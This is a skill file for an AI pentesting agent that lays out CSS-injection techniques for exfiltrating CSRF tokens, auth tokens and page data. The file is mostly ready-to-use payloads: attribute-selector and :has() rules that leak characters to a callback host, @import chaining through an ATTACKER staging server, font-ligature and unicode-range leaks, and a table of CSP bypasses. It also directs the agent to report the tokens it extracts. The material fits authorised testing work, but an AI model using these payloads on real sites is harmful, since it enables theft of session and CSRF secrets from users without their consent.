---
name: css-exfiltration-deep
description: "Trigger: CSS injection, CSS exfiltration, style tag injection, CSS data steal. Exploit CSS injection to exfiltrate CSRF tokens, secrets, and page data via CSS selectors and fonts."
license: Apache-2.0
metadata:
  author: "pentest-orchestrator"
  version: "1.0"
---

## Activation Contract

Load when testing for CSS injection vulnerabilities, style tag injection, HTML injection where JS is blocked (CSP), or when needing to exfiltrate data from pages without JavaScript — attribute selectors, `@import` chaining, font ligatures, inline `if()` conditionals, `:has()` exfiltration.

## Hard Rules

- CSS exfiltration is OUT-OF-BAND — you need a callback server (interact.sh, Burp Collaborator, or custom server).
- `@import` chaining requires an HTTP/2-capable server for optimal performance.
- Fontleak works cross-browser (Chrome, Firefox, Safari). Attribute selectors work everywhere.

## Decision Gates

| Technique | CSS Feature | Exfiltration Rate | Bypasses |
|-----------|-------------|-------------------|----------|
| Attribute selector | `input[value^="x"] { background: url(...) }` | ~1 char/request | CSP `img-src`, `style-src` |
| `@import` chaining (SIC) | `@import url(staging)` long-poll | Fast, multi-char | Requires CSS `@import` support |
| Font ligatures (Fontleak) | `@font-face` + custom ligatures | ~1000 chars/min | CSP `font-src`, animation timing |
| Inline style `if()` | `if(x = 1, url(...), none)` | Per-char inline | Chromium-only, requires `style=` |
| `:has()` selector | `html:has(input[value^="a"])` | Unknown structure | Requires modern CSS |
| `unicode-range` | `@font-face unicode-range: U+41` | Binary detection | Only presence, not value |

## Execution Steps

1. **Confirm CSS injection**: Inject `<style>body{background:red}</style>` or `xss` param with `</style><style>body{background:red}` → observe red background
2. **Attribute selector exfiltration**: Build CSS with `input[name="csrf_token"][value^="a"] { background: url(https://COLLAB/?c=a) }` for each char → iterate with `@import` chaining
3. **SIC (Sequential Import Chaining)**:
   - Inject `@import url(https://ATTACKER/staging);`
   - Staging long-polls: returns CSS for next character
   - Browser loads next payload → char found → callback → server generates next payload
4. **Fontleak (ligature exfiltration)**:
   - Generate custom font where `@any` → specific-width glyph
   - CSS `@container` queries detect width changes
   - Each character width uniquely identifies itself
   - Animation cycles through positions sequentially
5. **`:has()` blind exfiltration**: `html:has(input[name="csrf"][value^="a"]) { background: url(https://COLLAB/?c=a) }` — exfiltrate from unknown page structures
6. **Inline style conditional**: `<div style="background: if(attr(data-id x) = 'admin', url(https://COLLAB/), none)">` — exfiltrate without `<style>` tag
7. **Unicode-range font detection**: `@font-face { src: url(https://COLLAB/?char=A); unicode-range: U+41; }` — detect if character A exists on page

## Output Contract

Return:
- **type**: attr_selector_exfil | sic_import | fontleak_ligature | inline_conditional | has_selector | unicode_detect
- **injection_point**: Which param/header/field accepted CSS
- **data_exfiltrated**: Token/value extracted (full or partial)
- **technique**: Exact CSS payload used
- **severity**: Critical (auth tokens) / High (CSRF tokens) / Medium (info)
